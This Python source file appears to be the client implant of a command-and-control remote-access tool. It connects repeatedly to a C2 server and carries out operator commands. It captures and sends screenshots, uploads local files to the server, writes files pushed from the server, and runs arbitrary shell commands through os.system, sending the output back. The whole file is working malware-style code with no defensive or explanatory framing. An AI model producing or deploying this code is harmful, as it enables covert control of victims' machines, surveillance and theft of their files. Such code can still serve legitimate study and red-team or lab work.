import io
import logging
import os
import traceback
from multiprocessing import Process
from shlex import split
from sys import stdout, stderr
from tempfile import TemporaryFile
from time import sleep

import pyscreenshot as ImageGrab

from utils import C2Socket, RemoteDisconnected, Commands

logging.getLogger().setLevel(logging.DEBUG)

SERVER_IP = '127.0.0.1'
SERVER_PORT = 8888


class Server:
    def __init__(self, ip, port):
        with C2Socket(ip, port) as self.socket:
            self.start()

    def start(self):
        while True:
            logging.debug(f"Wait command from {self.socket}")
            command = self.socket.read_command()
            cmd_name, *cmd_args = split(command)
            logging.debug(f"Got command from {self.socket} : ({cmd_name}) -> {cmd_args}")
            cc = ClientCommands(self.socket, cmd_name, cmd_args, command)
            if cc.is_valid():
                cc.execute()


class ClientCommands(Commands):
    def command_screenshot(self):
        """ Take screenshot and send it to C2 """
        img = ImageGrab.grab()
        with io.BytesIO() as file:
            img.save(file, format=img.format)
            self.sock.send_file(file)

    def command_upload(self, filename):
        """ Receive file from C2 and save it to local HD """
        logging.debug(f"Local filename to save : {filename}")
        try:
            with open(filename, 'wb') as file:
                self.sock.read_into_file(file)
                logging.debug(f"Written : {filename}")
        except OSError as e:
            logging.error(f"Error trying to upload {filename} : {type(e)}, {e}")

    def command_download(self, filename):
        """ Send local file to C2 """
        logging.debug(f"Local filename to send : {filename}")
        if not os.path.exists(filename):
            logging.debug(f"{filename} does not exists")
        try:
            with open(filename, 'rb') as file:  # type: io.BufferedReader
                self.sock.send_file(file)
        except OSError as e:
            logging.error(f"Error trying to download {filename} : {type(e)}, {e}")

    def command_sh(self, *cmd):
        """ Send local file to C2 """
        logging.debug(self.input)

        def exec_shell():
            os.dup2(tmp.fileno(), stdout.fileno())
            os.dup2(tmp.fileno(), stderr.fileno())
            os.system(self.input)
            exit(0)

        with TemporaryFile() as tmp:
            p = Process(target=exec_shell, daemon=True)
            p.start()
            p.join()
            tmp.seek(0)
            output = tmp.read()
            logging.debug("Output : ", output)
            self.sock.send_packet(output)


def main():
    while True:
        try:
            with Server(SERVER_IP, SERVER_PORT) as server:
                server.start()
        except RemoteDisconnected as err:
            logging.warning("Server disconnect : %s" % err)
        except ConnectionRefusedError:
            logging.warning("Cannot connect to server")
        except BaseException as err:
            logging.critical("Unknown error : %s" % err)
            traceback.print_exc()
            break
        sleep(2)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt as e:
        logging.info("User cancel")
    except BaseException as e:
        logging.critical("Unknown exception : %s" % e)
